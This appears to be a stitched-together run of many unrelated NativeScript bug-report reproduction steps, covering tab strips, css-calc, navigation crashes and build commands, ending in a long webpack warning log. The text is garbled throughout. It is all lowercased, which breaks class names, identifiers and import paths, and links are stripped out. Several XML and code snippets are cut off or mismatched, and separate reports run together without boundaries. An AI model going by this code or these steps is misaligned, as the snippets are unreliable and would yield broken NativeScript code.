<tabstrip #mainnavigationstrip isiconsizefixed="false" iosiconrenderingmode="alwaysoriginal"> <tabstripitem class="nav-icon" [class.ios]="isios()" [class.selected]="selectedtab === 0"> <image src="font://&#xf25d;" class="fas"></image> </tabstripitem> <tabstripitem class="nav-icon" [class.ios]="isios()" [class.selected]="selectedtab === 1"> <image src="font://&#xf375;" class="fas"></image> </tabstripitem> <tabstripitem class="nav-icon" [class.ios]="isios()" [class.selected]="selectedtab === 2"> <image src="font://&#xf100;" class="fas"></image> </tabstripitem> <tabstripitem class="nav-icon" [class.ios]="isios()" [class.selected]="selectedtab === 3"> <image src="font://&#xf153;" class="fas"></image> </tabstripitem> <tabstripitem class="nav-icon" [class.ios]="isios()" [class.selected]="selectedtab === 4"> <image src="font://&#xf345;" class="fas"></image> </tabstripitem> </tabstrip>
try this expression:
.css-calc-nested { width: calc(calc(var(--undefined-var, 16) / 2) * 2)
``` this give the incorrect `width = 8`, but it should be `16`.
open and search names.
``` const label = new label(); label.style.on("marginleftchange", () => console.log(\'marginleftchange!\')); label.style.on("marginchange", () => console.log(\'marginchange!\')); label.style.marginleft = 5; label.style.margin = 10;
clone my repository:
cd nativescript-mapbox/src
npm run build.dist
cd ../demo-angular
tns build android
npm run e2e -- --runtype android28
(or whatever emulator you have)
it will crash between 3 and 100 iterations of navigating between the map page and the crash-test page.
just open the sample app provided below.
start the project and focus the text field.
update to latest `ng` cli
`ng new w1`
`ng add @nativescript/schematics`
`tns test init`
modify `tsconfig.tns.json`:
"files": [ "src/tests/example.ts" ]
`tns test ios`
just follow the steps of the gif:
- navigate forwards to the tabs-page by tapping the button.
- you can now swipe through the tabs but you do not see the tabstrip
- navigate forwards again by using the actionitem
- navigate backwards by using the hardware back-button
- now you see the tabstrip, but it does not have the complete style
- just open the playground sample provided below
- maybe you have to switch the tab one time to see the error in the logs
<!-- add commands used or steps taken to reproduce the behavior
--> use [this branch]( of the test app.
- navigate to the tabs page
- press the second navigation button
- return back to the tabs page **result:** the app will crash.
if you uninstall the nativescript-advanced-webview and make clean rebuild the issue will be gone.
create an animation using the `animation` class
play the animation, passing `true` to request a reset on finish.
rotate device to landscape, tested on iphonex
simply put a listpicker with items in a page in an angular project and run it on an android emulator api 29.
- from **"developer options"** activate **_"don\'t keep activities"_**
- create a template app as shown in **_sample project_** below
- select a car, open the template and tap on **edit**
- open the modal page e.g., by tapping **"class"** - do **not** select an option / close the modal
- suspend the app via the system buttons
- resume the app and interact with the opened modal / navigation result:
- the modal options are no longer responsive - you can't select an option or use the **_cancel_** button.
- tapping outside the button will close the modal but the tapping on **_"cancel"_** from the **actionbar** will cause the app to crash with a navigation error (shown below)
open the sample app provided below.
run unit tests app
app crashes with the exception above
reproducible only on ios9.
playground example:
run on ios.
result: there is a crash
error: uncaughterror error: onmeasure() did not set the measured dimension by calling setmeasureddimension() proxyviewcontainer(60)
git clone
cd nativescript-sdk-examples-js
tns run ios
and navigate to: tabs -> usage example
**actual behavior** home tab strip is selected.
playground example:
run on iphone 6.
result: the action bar is half visible
playground example:
tap on second tab.
tap on third tab.
result: the highlight is stuck on second tab and the page tab isn't slided.
run an app in the background for which location is on and open another app (app in which issue is facing) then issue will be reproduced
create a button, align it left and set its text to "go".
create a new nativescript project: tns create --ng test
edit `src/app/item/items.component.ts`
```typescript styles: [` .page { --my-factor: 0.5; opacity: calc(1 * var(--my-factor)); } `],
4: get this error:
js: error: failed to evaluate css-calc for property [opacity] for expression [calc(1 * 0.5)] to gridlayout(8)
typeerror: reduce_css_calc_1.default is not a function
js: at object._evaluatecsscalcexpression (
js: at evaluatecssexpressions (
js: at cssstate.push.../node_modules/tns-core-modules/ui/styling/style-scope.js.cssstate.setpropertyvalues (
js: at
js: at gridlayout.push.../node_modules/tns-core-modules/ui/core/view-base/view-base.js.viewbase._batchupdate (
js: at cssstate.push.../node_modules/tns-core-modules/ui/styling/style-scope.js.cssstate.updatedynamicstate (
js: at cssstate.push.../..
create a new project with: `tns create --ng statusbar-testy`.
run the app on an ios hardware device.
![unadjustednonraw_thumb_2]( 3
share the internet connection with another device.
the status-bar should now be taller
![unadjustednonraw_thumb_3]( 5
go to the desktop or another app.
go back to the app
the layout is now broken (notice the list items).
![unadjustednonraw_thumb_4](
rotate the phone to portrait and back again, to restore the layout
open the following playground project
tap the "start" button.
erroneous behavior can be observed in e2e/ui-tests-app -> bottom-navigation -> icon-change example
change root view classname after running the app.
* `observable` is imported from `tns-core-modules/ui/page/page`
correct one is `tns-core-modules/data/observable`
* `observablearray` is imported from `tns-core-modules/data/observable-array/observable-array`
correct one is `tns-core-modules/data/observable-array`
* `view` is imported from `tns-core-modules/ui/page/page`
correct one is `tns-core-modules/ui/core/view`
* `gridlayout` isn't even recognized for auto import
triple tap on the button from the repro page.
to reproduce: 1
have a page that transitions to a second page via an unanimated navigation 2
have that second page transition to a third page via an animated navigation
have the third page call frame.goback() to get to the first page
bug should be seen.
- open any modal view
- make changes to that modal views xml
- save the changes and wait for hmr to livesync the changes
tap on button in the action bar
run the playground example.
create a new project (tested with react-nativescript and plain typescript project - hello world starter template)
set an id for actionbar and add an event handler to it - *in the page navigatingto function code behind...* ``` const actionbar = page.getviewbyid("actionbar") as actionbar; actionbar.addeventlistener(actionbar.loadedevent, (event) => { // (actionbar.ios as uinavigationbar).topitem.title = "i wwaaas changed"; // does not work settimeout(() => { (actionbar.ios as uinavigationbar).topitem.title = "i wwaaas changed"; // works }, 0.000000001); });
go on the second tab and try to focus the field.
go to dev settings in android device and turn on the "don\'t keep activities" option
start [this {n} app]( (or any other using frame navigation).
tap `navigate` button - the app navigates to other page.
switch to other app (doing this will destroy the app's activities).
switch back to the sample {n} app.
tap `navigate back` button
the app crashes.
using nested-frame-navigation -> tabs root (not yet merged) or just use tabs (2-3 items) with nested frames inside
go to teams tab
go back to players tab - fails ![screen shot 2019-07-22 at 2 01 28 pm](
have the following markup:
<bottomnavigation> <tabstrip> <tabstripitem title="first"></tabstripitem> <tabstripitem title="second"></tabstripitem> </tabstrip> <tabcontentitem> <tabs> <tabstrip backgroundcolor="palevioletred"> <tabstripitem title="first"></tabstripitem> <tabstripitem title="second"></tabstripitem> </tabstrip> <tabcontentitem> <gridlayout backgroundcolor="skyblue"> <label text="first view"/> </gridlayout> </tabcontentitem> <tabcontentitem> <gridlayout backgroundcolor="gold"> <label text="second view" /> </gridlayout> </tabcontentitem> </tabs> </tabcontentitem> <tabcontentitem> <gridlayout> <label text="second view" /> </gridlayout> </tabcontentitem> </bottomnavigation>
use the following setup :
<actionbar></actionbar>
<gridlayout> <tabs> <tabstrip> <tabstripitem title="first" class="special"></tabstripitem> <tabstripitem title="second"></tabstripitem> </tabstrip> <tabcontentitem class="special"> <gridlayout> <label text="first view" /> </gridlayout> </tabcontentitem> <tabcontentitem> <gridlayout> <label text="second view" /> </gridlayout> </tabcontentitem> </tabs>
</gridlayout>
define more tabstripitems than tabcontentitems
<tabs> <tabstrip> <tabstripitem title="players"></tabstripitem> <tabstripitem title="dummy"></tabstripitem> <tabstripitem title="teams"></tabstripitem> </tabstrip>
use the following snippet (also available in e2e/ui-tests-app -> tabs -> color example):
``` xml <tabs> <tabstrip> <tabstripitem title="first" class="special"></tabstripitem> <tabstripitem title="second"></tabstripitem> </tabstrip> <tabcontentitem class="special"> <gridlayout> <label text="first view" /> </gridlayout> </tabcontentitem> <tabcontentitem> <gridlayout> <label text="second view" /> </gridlayout> </tabcontentitem> </tabs>
tabs { color: gold;
} tabcontentitem.special { color: olive;
} tabstrip { color: skyblue;
} tabstripitem.special { color: teal;
} tabstripitem.special:active { color: yellowgreen;
use the following code snippet based on e2e/ui-tests-app -> bottom-navigation -> font-icons example):
``` xml <tabs class="font-awesome"> <tabstripitem title="third" iconsource="font://&#xf556;" class="font-awesome font-size"></tabstripitem> </tabstrip> <tabcontentitem class="special"> <gridlayout> <label text="first view" /> </gridlayout> </tabcontentitem> <tabcontentitem> <gridlayout> <label text="second view" /> </gridlayout> </tabcontentitem> <tabcontentitem> <gridlayout> <label text="third view" /> </gridlayout> </tabcontentitem> </tabs>
.font-awesome { font-family: "fontawesome";
} .font-size { font-size: 36;
} .color { color: blue;
} tabstripitem:active { color: red;
open
scan qr code with device
open device log tab
use the following setup (also visible in e2e/ui-tests-app -> tabs -> background-color or e2e/ui-tests-app -> bottom-navigation -> background-color examples):
<tabs> <tabstrip> <tabstripitem title="first" class="special"></tabstripitem> <tabstripitem title="second"></tabstripitem> </tabstrip> <tabcontentitem class="special"> <gridlayout> <label text="first view" /> </gridlayout> </tabcontentitem> <tabcontentitem> <gridlayout> <label text="second view" /> </gridlayout> </tabcontentitem>
tabcontentitem.special { background-color: olive;
use the following setup (also visible in e2e/ui-tests-app -> tabs -> color example):
``` xml <tabs> <tabstrip> <tabstripitem title="first" class="special"></tabstripitem> <tabstripitem title="second"></tabstripitem> </tabstrip> <tabcontentitem class="special"> <gridlayout> <label text="first view" /> </gridlayout> </tabcontentitem> <tabcontentitem> <gridlayout> <label text="second view" /> </gridlayout> </tabcontentitem> </tabs>
tabstripitem.special { color: teal;
use the following setup (also visible in e2e/ui-tests-app -> tabs -> background-color example):
<tabs> <tabstrip> <tabstripitem title="first" class="special"></tabstripitem> <tabstripitem title="second"></tabstripitem> </tabstrip> <tabcontentitem class="special"> <gridlayout> <label text="first view" /> </gridlayout> </tabcontentitem> <tabcontentitem> <gridlayout> <label text="second view" /> </gridlayout> </tabcontentitem>
tabstripitem.special { background-color: teal;
} tabstripitem.special:active { background-color: yellowgreen;
using `e2e/nested-frame-navigation`: 1
go to _page w/ bottom navigation_
_navigate to some page (no transition)_
go back -- app crashes with the following exception:
an uncaught exception occurred on "main" thread.
the specified child already has a parent
you must call removeview() on the child's parent first.
java.lang.illegalstateexception: the specified child already has a parent
you must call removeview() on the child's parent first.
use the following xml declaration:
<bottomnavigation backgroundcolor="yellow"> <button text="go to fifth (no tabstrip item)" tap="ontap" /> </gridlayout> </tabcontentitem> <tabcontentitem> <gridlayout> <label text="second view" /> </gridlayout> </tabcontentitem> <tabcontentitem> <gridlayout> <label text="third view" /> </gridlayout> </tabcontentitem> <tabcontentitem> <gridlayout> <label text="fourth view" /> </gridlayout> </tabcontentitem> <tabcontentitem> <gridlayout> <label text="fifth view" /> </gridlayout> </tabcontentitem>
</bottomnavigation>
<page> <tabs id="tabs"> <tabstrip> <tabstripitem title="tabstripitem 1"> </tabstripitem> </tabstrip> <tabcontentitem> <label text="tabcontentitem 1" /> </tabcontentitem> </tabs>
``` **output** ```
console log ### nativescripterror: typeerror: undefined is not an object (evaluating 'nextitem.__controller')
console log ### nativeexception: undefined
console log ### stacktrace: js: 1 pageviewcontrollerviewcontrollerafterviewcontroller@
2 uiapplicationmain@[native code]
3 _start@
clone git project
run the program on android tns run android --env.uglify
please add if this is a same case on ios as well!
- a [sample tabs page](
**expected** icons to be shown along with the **titles**
**actual** ![actual](
- a [sample tabs page](
tap on *tabstripitem 3*
**expected** ![expected]( **actual** ![actual](
open the app and click the button:
<bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
run the sample here:
try any 204 rest api with returning content-type="application/json".i am working with the loopback backend server.actually loopback returning the 204 rest api response with content-type="application/json"
(
so the response is going to the error block
create a custom component that extends span.
add it inside formattedstring
click on `change fields values button`
update the value on one of the fields in the app
click `check value` **expected behaviour**
the updated value to be printed in the code-behind.
try the sample project.
build the attached project and select a new listview's item.
- create new project.
- add timepickerfield to xml.
- set minminute=10 in xml.
- set minhour=10 in xml.
- set maxminute=48 in xml.
- set maxhour=18 in xml.
- tns run android
run unit tests app with bundle workflow from
define custom component:
// app/components/my-control.ts
import { stacklayout } from "tns-core-modules/ui/layouts/stack-layout/stack-layout";
import { label } from "tns-core-modules/ui/label/label";
import { button } from "tns-core-modules/ui/button/button"; export class mycontrol extends stacklayout { constructor() { super(); let counter: number = 0; const lbl = new label(); const btn = new button(); btn.text = "tap me!"; btn.on("tap", (args) => { lbl.text = "tap " + counter++; }); this.addchild(lbl); this.addchild(btn); }
reference it in a page:
<page xmlns:customcontrols="components/my-control" navigatingto="navigatingto" class="page"> <customcontrols:mycontrol />
build app with bundle workflow
clone nativescript repo locally `git clone git@github.com:nativescript/nativescript.git`
`cd nativescript`
run setup steps:
npm install
npm run setup
tsc --skiplibcheck -w
open another terminal and create blank typescript project:
tns create dev-test --template tns-template-blank-ts
cd dev-test
link local tns-core-modules in the new project:
npm install ../nativescript/tns-core-modules --save
execute `tns run android` or `tns run ios` (`uselegacyworkflow` is false in nsconfig)
command fails on both platforms with the following logs
tns run android
skipping node_modules folder! use the syncallfiles option to sync files from this folder.
searching for devices...
running webpack for android...
clean-webpack-plugin: /users/mdonev/github/dev-test/platforms/android/app/src/main/assets/app/**/* has been removed.
file change detected
starting incremental webpack compilation...
starting type checking service...
using 1 worker with 2048mb memory limit webpack is watching the files no type errors found
version: typescript 3.1.6
time: 6402ms
hash: 8ac1443e66e2dfc56097
version: webpack 4.27.1
time: 11320ms
built at: 2019-05-22 16:21:13 asset size chunks chunk names app_resources/android/app.gradle 556 bytes [emitted] app_resources/android/src/main/androidmanifest.xml 1.33 kib [emitted] app_resources/android/src/main/res/drawable-hdpi/background.png 3.42 kib [emitted] app_resources/android/src/main/res/drawable-hdpi/icon.png 6.8 kib [emitted] app_resources/android/src/main/res/drawable-hdpi/logo.png 32.4 kib [emitted] app_resources/android/src/main/res/drawable-ldpi/background.png 1.31 kib [emitted] app_resources/android/src/main/res/drawable-ldpi/icon.png 3.23 kib [emitted] app_resources/android/src/main/res/drawable-ldpi/logo.png 9.95 kib [emitted] app_resources/android/src/main/res/drawable-mdpi/background.png 1.89 kib [emitted] app_resources/android/src/main/res/drawable-mdpi/icon.png 3.42 kib [emitted] app_resources/android/src/main/res/drawable-mdpi/logo.png 15.8 kib [emitted]
app_resources/android/src/main/res/drawable-nodpi/splash_screen.xml 304 bytes [emitted] app_resources/android/src/main/res/drawable-xhdpi/background.png 5.26 kib [emitted] app_resources/android/src/main/res/drawable-xhdpi/icon.png 10.4 kib [emitted] app_resources/android/src/main/res/drawable-xhdpi/logo.png 54 kib [emitted] app_resources/android/src/main/res/drawable-xxhdpi/background.png 10.3 kib [emitted] app_resources/android/src/main/res/drawable-xxhdpi/icon.png 20.3 kib [emitted] app_resources/android/src/main/res/drawable-xxhdpi/logo.png 116 kib [emitted] app_resources/android/src/main/res/drawable-xxxhdpi/background.png 3.87 kib [emitted] app_resources/android/src/main/res/drawable-xxxhdpi/icon.png 73.8 kib [emitted] app_resources/android/src/main/res/drawable-xxxhdpi/logo.png 193 kib [emitted] app_resources/android/src/main/res/values-v21/colors.xml 104 bytes [emitted] app_resources/android/src/main/res/values-v21/styles.xml 898 bytes [emitted] app_resources/android/src/main/res/values/colors.xml 237 bytes [emitted] app_resources/android/src/main/res/values/styles.xml 1.68 kib [emitted] bundle.js 3.07 mib bundle [emitted] bundle package.json 82 bytes [emitted] runtime.js 29.8 kib runtime [emitted] runtime starter.js 60 bytes [emitted] tns-java-classes.js 0 bytes [emitted] vendor.js 35.4 kib vendor [emitted] vendor
entrypoint bundle = runtime.js vendor.js bundle.js
[../../nativescript/tns-core-modules/application/application-common.ts] /users/mdonev/github/nativescript/tns-core-modules/application/application-common.ts 3.5 kib {bundle} [built]
[../../nativescript/tns-core-modules/application/application.ts] /users/mdonev/github/nativescript/tns-core-modules/application/application.ts 14.2 kib {bundle} [built]
[../../nativescript/tns-core-modules/bundle-entry-points.ts] /users/mdonev/github/nativescript/tns-core-modules/bundle-entry-points.ts 3.46 kib {bundle} [built]
[../../nativescript/tns-core-modules/debugger/devtools-elements.js] /users/mdonev/github/nativescript/tns-core-modules/debugger/devtools-elements.js 1.39 kib {bundle} [built]
[../../nativescript/tns-core-modules/globals/globals.ts] /users/mdonev/github/nativescript/tns-core-modules/globals/globals.ts 8.08 kib {bundle} [built]
[../../nativescript/tns-core-modules/profiling/profiling.ts] /users/mdonev/github/nativescript/tns-core-modules/profiling/profiling.ts 8.75 kib {bundle} [built]
[../../nativescript/tns-core-modules/text/formatted-string.ts] /users/mdonev/github/nativescript/tns-core-modules/text/formatted-string.ts 6.33 kib {bundle} [built]
[../../nativescript/tns-core-modules/text/span.ts] /users/mdonev/github/nativescript/tns-core-modules/text/span.ts 2.7 kib {bundle} [built]
[../../nativescript/tns-core-modules/ui/action-bar/action-bar.ts] /users/mdonev/github/nativescript/tns-core-modules/ui/action-bar/action-bar.ts 16 kib {bundle} [built]
[../../nativescript/tns-core-modules/ui/activity-indicator/activity-indicator.ts] /users/mdonev/github/nativescript/tns-core-modules/ui/activity-indicator/activity-indicator.ts 2.48 kib {bundle} [built]
[../../nativescript/tns-core-modules/ui/border/border.ts] /users/mdonev/github/nativescript/tns-core-modules/ui/border/border.ts 2.3 kib {bundle} [built]
[../../nativescript/tns-core-modules/ui/frame/activity.ts] /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts 2.7 kib {bundle} [built]
[../../nativescript/tns-core-modules/ui/frame/frame.ts] /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts 58.3 kib {bundle} [built]
[./ sync recursive (root|page)\\.(xml|css|js|ts|scss)$]
sync (root|page)\\.(xml|css|js|ts|scss)$ 228 bytes {bundle} [built]
[./app.ts] 1.72 kib {bundle} [built] + 154 hidden modules warning in /users/mdonev/github/nativescript/tns-core-modules/ui/frame/fragment.transitions.ts 122:87-100
"export \'animationtype\' was not found in \'./fragment.transitions\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts 380:44-57
"export \'animationtype\' was not found in \'./fragment.transitions\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/frame/fragment.transitions.ts 151:13-26
"export \'animationtype\' was not found in \'./fragment.transitions\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts 703:17-30
"export \'animationtype\' was not found in \'./fragment.transitions\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts 706:17-30
"export \'animationtype\' was not found in \'./fragment.transitions\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts 709:17-30
"export \'animationtype\' was not found in \'./fragment.transitions\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts 712:17-30
"export \'animationtype\' was not found in \'./fragment.transitions\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/frame/fragment.transitions.ts 122:52-65
"export \'animationtype\' was not found in \'./fragment.transitions\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/frame/fragment.transitions.ts 148:13-26
"export \'animationtype\' was not found in \'./fragment.transitions\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/frame/fragment.transitions.ts 142:13-26
"export \'animationtype\' was not found in \'./fragment.transitions\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/frame/fragment.transitions.ts 145:13-26
"export \'animationtype\' was not found in \'./fragment.transitions\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts 380:82-95
"export \'animationtype\' was not found in \'./fragment.transitions\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts 466:61-75
"export \'backstackentry\' was not found in \'.\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts 466:95-109
"export \'backstackentry\' was not found in \'.\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/builder/builder.ts 657:64-79
"export \'componentmodule\' was not found in \'./component-builder\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/builder/builder.ts 657:99-114
"export \'componentmodule\' was not found in \'./component-builder\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/core/bindable/bindable.ts 10:0-173
"export \'eventdata\' was not found in \'../../../data/observable\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view-base/view-base.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/core/bindable/bindable.ts 10:0-173
"export \'propertychangedata\' was not found in \'../../../data/observable\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view-base/view-base.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/core/view-base/view-base.ts 12:0-43
"export \'isios\' was not found in \'../../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/styling/style-properties.ts 790:100-105
"export \'isios\' was not found in \'../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/styling/style-properties.ts 206:135-140
"export \'isios\' was not found in \'../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/styling/style-properties.ts 208:138-143
"export \'isios\' was not found in \'../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/styling/style-properties.ts 210:132-137
"export \'isios\' was not found in \'../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/styling/style-properties.ts 212:141-146
"export \'isios\' was not found in \'../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/styling/style-properties.ts 158:85-90
"export \'isios\' was not found in \'../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/styling/style-properties.ts 235:93-98
"export \'isios\' was not found in \'../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/styling/style-properties.ts 242:89-94
"export \'isios\' was not found in \'../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/styling/style-properties.ts 249:95-100
"export \'isios\' was not found in \'../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/styling/style-properties.ts 264:175-180
"export \'isios\' was not found in \'../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/styling/style-properties.ts 276:167-172
"export \'isios\' was not found in \'../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/styling/style-properties.ts 751:98-103
"export \'isios\' was not found in \'../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/styling/style-properties.ts 764:102-107
"export \'isios\' was not found in \'../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/styling/style-properties.ts 777:104-109
"export \'isios\' was not found in \'../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/activity.ts @ ./app.ts warning in /users/mdonev/github/nativescript/tns-core-modules/ui/styling/style-properties.ts 176:12-17
